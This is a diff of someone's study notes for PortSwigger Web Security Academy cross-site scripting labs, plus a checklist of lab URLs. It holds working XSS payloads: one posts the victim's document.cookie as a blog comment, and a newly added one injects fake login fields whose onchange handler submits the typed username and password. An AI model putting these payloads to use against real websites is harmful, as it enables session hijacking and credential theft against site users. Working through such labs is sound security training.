@@ -224,7 +224,7 @@ function handleResponse() {
 </script>
 ```
 
-## PortSwigger challenged: stealing cookies using CSRF (https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)
+## PortSwigger XSS Exploitation challenges: stealing cookies using CSRF (https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)
 ```html
 <script>
 var req = new XMLHttpRequest();
@@ -243,11 +243,17 @@ body: "csrf=" + token + "&postId=10&comment=mycookie:"+ document.cookie + "&name
 </script>
 ```
 
+## PortSwigger XSS Exploitation challenges: stealing credentials using CSRF (https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords)
+```html
+<input name=username id=username>
+<input type=password name=password onchange="var token = document.getElementsByName('csrf')[0].value;fetch('post/comment', {method: 'POST',mode: 'no-cors',headers: {'Content-Type' : 'application/x-www-form-urlencoded',},body: 'csrf=' + token + '&postId=2&comment='+ username.value + ':' + this.value + '&name=test&email=test%40test.com&website=http%3A%2F%2Ftest.com'});">
+```
+
 ---
 
 checkpoint
-https://portswigger.net/web-security/cross-site-scripting
-   https://portswigger.net/web-security/cross-site-scripting/reflected  
-      https://portswigger.net/web-security/cross-site-scripting/exploiting  
-         https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf  
-            https://roadmap.sh/backend
+- [X] https://portswigger.net/web-security/cross-site-scripting
+- [X] https://portswigger.net/web-security/cross-site-scripting/reflected  
+- [X] https://portswigger.net/web-security/cross-site-scripting/exploiting
+- [ ] https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf  
+      https://roadmap.sh/backend
